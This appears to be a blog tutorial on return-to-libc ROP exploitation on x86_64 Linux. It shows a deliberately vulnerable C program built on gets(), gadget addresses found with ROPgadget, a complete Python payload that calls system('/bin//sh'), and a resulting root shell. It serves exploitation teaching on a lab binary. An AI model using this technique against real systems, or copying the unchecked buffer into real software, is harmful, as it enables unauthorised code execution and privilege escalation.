---
layout: post
title: "[ROP] Ret to LibC"
categories: [pwn]
tags: [pwn, ROP]
description: How to bypass NX/ASLR protections using "ret to LibC" attacks on a x64 Linux system.
---

Tools:
1. objdump
2. ROPgadget

Binary protection:
1. Read Only relocations
2. No exec stack
3. No exec heap
4. ASLR

Compilation: Static

Architecture: x86_64

Operating System: Linux (Debian)

# 1. Vulnerable binary
We can do a lot of things thanks to Return Oriented Programming. Today I will show you how to return to Libc function.
```c
#include <stdio.h>
#include <stdlib.h>

void my_system()
{
  printf("Who I am:\n");
  system("whoami");
}

int main(int ac, char **av)
{
  char buf[64];

  gets(buf);    // Warning
  my_system();
  printf("me:\n%s", buf);
  return 0;
}
```

This very simple program use the "system" libc function to display the "whoami" command output. We will hijack the program to execute the "/bin/sh" command instead of "whoami".

# 2. To begin
If we take a look at the compile code, we can see:
```nasm
$ objdump -D a.out | grep -A 12 "<__libc_system>:"
00000000004075d0 <__libc_system>:
  4075d0:	48 85 ff             	test   %rdi,%rdi
  4075d3:	74 0b                	je     4075e0 <__libc_system+0x10>
  4075d5:	e9 26 fc ff ff       	jmpq   407200 <do_system>
  4075da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4075e0:	48 83 ec 08          	sub    $0x8,%rsp
  4075e4:	bf d6 8b 48 00       	mov    $0x488bd6,%edi
  4075e9:	e8 12 fc ff ff       	callq  407200 <do_system>
  4075ee:	85 c0                	test   %eax,%eax
  4075f0:	0f 94 c0             	sete   %al
  4075f3:	48 83 c4 08          	add    $0x8,%rsp
  4075f7:	0f b6 c0             	movzbl %al,%eax
  4075fa:	c3                   	retq
```

It's the assembly code of the system function. The function simply take a parameter which is place in the RDI register and represent the command executed by the system function.

So the playload will look like:
```bash
+---------------------------+
|          pop rsi          |
|          @ data           |
|          pop rax          |
|  mov QWORD PTR [rsi], rax |
|          pop rdi          |
|          @ data           |
|     @ __libc_system       |
+---------------------------+
```

# 3. The payload
Thanks to ROPgadget, we easily can get all the gadget we need:
```bash
$ ROPgadget --binary a.out | egrep "pop rsi ; ret|pop rax ; ret|mov qword ptr \[rsi\], rax ; ret|pop rdi ; ret"
...
0x000000000045fd31 : mov qword ptr [rsi], rax ; ret
0x0000000000431d4d : pop rax ; ret
0x00000000004015cb : pop rdi ; ret
0x00000000004016e7 : pop rsi ; ret
...
```

As we already have the system address, we only need the data address:
```bash
$ objdump -D a.out | grep "<data>":
00000000006b84b8 <data>:
```

The whole payload will look like:
```python
#!/usr/bin/env python2.7

from struct import pack

payload = 'A'*72 # Padding

payload += pack("<Q", 0x00000000004016e7) # pop rsi ; ret
payload += pack("<Q", 0x00000000006b84b8) # @ data
payload += pack("<Q", 0x0000000000431d4d) # pop rax ; ret
payload += '/bin//sh'
payload += pack("<Q", 0x000000000045fd31) # mov qword ptr [rsi], rax ; ret
payload += pack("<Q", 0x00000000004015cb) # pop rdi ; ret
payload += pack("<Q", 0x00000000006b84b8) # @ data

payload += pack("<Q", 0x00000000004075d0) # @ __libc_system

print payload
```

# 4. Exploitation
A root shell please !
```bash
$ (python rop.py;cat) | ./a.out
Who I am:
root
me:
id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
```

Done.
